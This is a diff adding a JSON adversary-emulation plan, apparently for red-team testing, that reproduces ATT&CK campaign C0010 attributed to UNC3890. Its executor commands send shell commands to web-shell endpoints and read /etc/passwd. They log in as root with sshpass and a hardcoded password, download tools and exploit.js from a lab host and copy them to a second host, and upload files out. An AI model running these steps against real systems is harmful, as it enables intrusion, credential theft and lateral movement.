@@ -1,0 +1,306 @@
+{
+  "abilities": [
+    {
+      "ability_id": "34af5843-02fb-5ebf-a1db-1655499d60fc",
+      "campaign_id": "c0010",
+      "description": "For C0010, UNC3890 actors used unique malware, including SUGARUSH and SUGARDUMP.",
+      "executors": [
+        {
+          "command": "curl -X POST -F 'cmd=uname -a' http://192.168.20.30:5015/exec; curl -X POST -F 'cmd=whoami' http://192.168.20.30:5015/exec; curl -X POST -F 'cmd=ps aux' http://192.168.20.30:5015/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://192.168.20.30:5015/exec",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1587.001 - Malware",
+      "tactic": "resource-development",
+      "technique_id": "T1587.001",
+      "technique_name": "Malware",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "543281ce-dbb9-548d-9a1b-d124eb25c0fe",
+      "campaign_id": "c0010",
+      "description": "During C0010, UNC3890 actors likely compromised the domain of a legitimate Israeli shipping company.",
+      "executors": [
+        {
+          "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/; nc -vz 192.168.20.30 53; dig @192.168.20.30 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1584.001 - Domains",
+      "tactic": "resource-development",
+      "technique_id": "T1584.001",
+      "technique_name": "Domains",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "54e2a639-a5e0-551d-94d0-2ba7963ec095",
+      "campaign_id": "c0010",
+      "description": "During C0010, UNC3890 actors downloaded tools and malware onto a compromised host.",
+      "executors": [
+        {
+          "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@192.168.20.30:/tmp/wget;sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'chmod +x /tmp/wget && /tmp/wget -O /tmp/tool.sh http://192.168.20.30/tool.sh && /tmp/wget -O /tmp/tool.bin http://192.168.20.30/tool.bin';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.sh root@192.168.30.40:/tmp/tool.sh';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.bin root@192.168.30.40:/tmp/tool.bin'",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1105 - Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "5f7f2aa0-c1b4-5567-8054-6de331dda348",
+      "campaign_id": "c0010",
+      "description": "For C0010, UNC3890 actors obtained multiple publicly-available tools, including METASPLOIT, UNICORN, and NorthStar C2.",
+      "executors": [
+        {
+          "command": "curl -X POST -F 'cmd=uname -a' http://192.168.20.30:5000/exec; curl -X POST -F 'cmd=whoami' http://192.168.20.30:5000/exec; curl -X POST -F 'cmd=ps aux' http://192.168.20.30:5000/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://192.168.20.30:5000/exec",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1588.002 - Tool",
+      "tactic": "resource-development",
+      "technique_id": "T1588.002",
+      "technique_name": "Tool",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "5f7f2aa0-c1b4-5567-8054-roth",
+      "campaign_id": "c0010",
+      "description": "This is the end.",
+      "executors": [
+        {
+          "command": "echo \"END OF C0010\"",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "END OF C0010",
+      "tactic": "impact",
+      "technique_id": "T1529",
+      "technique_name": "System Shutdown",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "ab57f184-42b1-5f15-be3c-f126ddfd3592",
+      "campaign_id": "c0010",
+      "description": "For C0010, UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.",
+      "executors": [
+        {
+          "command": "dig @192.168.20.30 www.malicious-example.com A +short",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1583.001 - Domains",
+      "tactic": "resource-development",
+      "technique_id": "T1583.001",
+      "technique_name": "Domains",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "b6970795-061f-5af3-9d1a-577567de3cb3",
+      "campaign_id": "c0010",
+      "description": "During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.",
+      "executors": [
+        {
+          "command": "curl http://192.168.20.30/ > /dev/null && curl http://192.168.20.30:5000/exploit.js > /tmp/exploit.js && curl --data \"username=victim&password=Passw0rd\" http://192.168.20.30/foca.php",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1189 - Drive-by Compromise",
+      "tactic": "initial-access",
+      "technique_id": "T1189",
+      "technique_name": "Drive-by Compromise",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "eae86ac6-f7b1-55cc-9fb3-7a7699c980a7",
+      "campaign_id": "c0010",
+      "description": "For C0010, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.",
+      "executors": [
+        {
+          "command": "curl -F \"file=@/bin/bash\" http://192.168.20.30:8010/upload",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1608.001 - Upload Malware",
+      "tactic": "resource-development",
+      "technique_id": "T1608.001",
+      "technique_name": "Upload Malware",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "f5ba0057-a665-5bd8-8abb-d5e524a61c2f",
+      "campaign_id": "c0010",
+      "description": "For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.",
+      "executors": [
+        {
+          "command": "curl http://192.168.20.30/tools/tool.txt -o /tmp/tool.txt",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1608.002 - Upload Tool",
+      "tactic": "resource-development",
+      "technique_id": "T1608.002",
+      "technique_name": "Upload Tool",
+      "translation_source": "human_curation"
+    },
+    {
+      "ability_id": "fdcf47ad-b244-560b-800b-a62005334b0c",
+      "campaign_id": "c0010",
+      "description": "For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.",
+      "executors": [
+        {
+          "command": "curl \"http://192.168.20.30/oili.php?cmd=ip%20addr\"",
+          "name": "sh",
+          "platform": "linux"
+        }
+      ],
+      "name": "T1608.004 - Drive-by Target",
+      "tactic": "resource-development",
+      "technique_id": "T1608.004",
+      "technique_name": "Drive-by Target",
+      "translation_source": "human_curation"
+    }
+  ],
+  "adversary": {
+    "atomic_ordering": [
+      "543281ce-dbb9-548d-9a1b-d124eb25c0fe",
+      "eae86ac6-f7b1-55cc-9fb3-7a7699c980a7",
+      "b6970795-061f-5af3-9d1a-577567de3cb3",
+      "fdcf47ad-b244-560b-800b-a62005334b0c",
+      "34af5843-02fb-5ebf-a1db-1655499d60fc",
+      "ab57f184-42b1-5f15-be3c-f126ddfd3592",
+      "54e2a639-a5e0-551d-94d0-2ba7963ec095",
+      "f5ba0057-a665-5bd8-8abb-d5e524a61c2f",
+      "5f7f2aa0-c1b4-5567-8054-6de331dda348",
+      "5f7f2aa0-c1b4-5567-8054-roth"
+    ],
+    "campaign_id": "c0010",
+    "description": "C0010 emulation plan with 9 techniques",
+    "id": "30aff91c-eb58-5862-af27-d3ccfe777d8e",
+    "name": "C0010",
+    "translation_source": "human_curation"
+  },
+  "attack_flow": {
+    "campaign_id": "c0010",
+    "content": {
+      "campaign_name": "C0010",
+      "edges": [
+        {
+          "from": "2cc6674d-b08f-46f8-bda3-62feaf53161c",
+          "to": "fae3e265-15fc-4eb2-ad8e-b9498dfb8f9b"
+        },
+        {
+          "from": "fae3e265-15fc-4eb2-ad8e-b9498dfb8f9b",
+          "to": "192e266d-ac67-4868-abac-d045698e1e2b"
+        },
+        {
+          "from": "192e266d-ac67-4868-abac-d045698e1e2b",
+          "to": "2ffd9d37-b145-4f35-b28e-cc15d922e7da"
+        },
+        {
+          "from": "2ffd9d37-b145-4f35-b28e-cc15d922e7da",
+          "to": "e3135180-fd0d-4242-ae9a-8dbd1537f91c"
+        },
+        {
+          "from": "e3135180-fd0d-4242-ae9a-8dbd1537f91c",
+          "to": "3fc58067-ed35-444b-b831-0e7e4fe94457"
+        },
+        {
+          "from": "3fc58067-ed35-444b-b831-0e7e4fe94457",
+          "to": "9df97645-8fd7-4d28-8cfb-aeee6e7a9dc0"
+        },
+        {
+          "from": "9df97645-8fd7-4d28-8cfb-aeee6e7a9dc0",
+          "to": "04460454-48cf-438b-b8b9-da743ca3acd5"
+        },
+        {
+          "from": "04460454-48cf-438b-b8b9-da743ca3acd5",
+          "to": "afcd55e9-1b0a-4828-8e6a-8872b107ae96"
+        }
+      ],
+      "structural_nodes": [
+        {
+          "node_id": "2cc6674d-b08f-46f8-bda3-62feaf53161c",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1584.001",
+          "technique_name": "Domains"
+        },
+        {
+          "node_id": "fae3e265-15fc-4eb2-ad8e-b9498dfb8f9b",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1608.001",
+          "technique_name": "Upload Malware"
+        },
+        {
+          "node_id": "192e266d-ac67-4868-abac-d045698e1e2b",
+          "node_type": "structural",
+          "tactic": "initial-access",
+          "technique_id": "T1189",
+          "technique_name": "Drive-by Compromise"
+        },
+        {
+          "node_id": "2ffd9d37-b145-4f35-b28e-cc15d922e7da",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1608.004",
+          "technique_name": "Drive-by Target"
+        },
+        {
+          "node_id": "e3135180-fd0d-4242-ae9a-8dbd1537f91c",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1587.001",
+          "technique_name": "Malware"
+        },
+        {
+          "node_id": "3fc58067-ed35-444b-b831-0e7e4fe94457",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1583.001",
+          "technique_name": "Domains"
+        },
+        {
+          "node_id": "9df97645-8fd7-4d28-8cfb-aeee6e7a9dc0",
+          "node_type": "structural",
+          "tactic": "command-and-control",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer"
+        },
+        {
+          "node_id": "04460454-48cf-438b-b8b9-da743ca3acd5",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1608.002",
+          "technique_name": "Upload Tool"
+        },
+        {
+          "node_id": "afcd55e9-1b0a-4828-8e6a-8872b107ae96",
+          "node_type": "structural",
+          "tactic": "resource-development",
+          "technique_id": "T1588.002",
+          "technique_name": "Tool"
+        }
+      ]
+    },
+    "identifier": "human-curation-v1",
+    "label": "ATT&CK Campaign C0010"
+  },
+  "campaign": {
+    "description": "C0010",
+    "id": "c0010",
+    "name": "ATT&CK Campaign C0010",
+    "translation_source": "human_curation"
+  }
+}
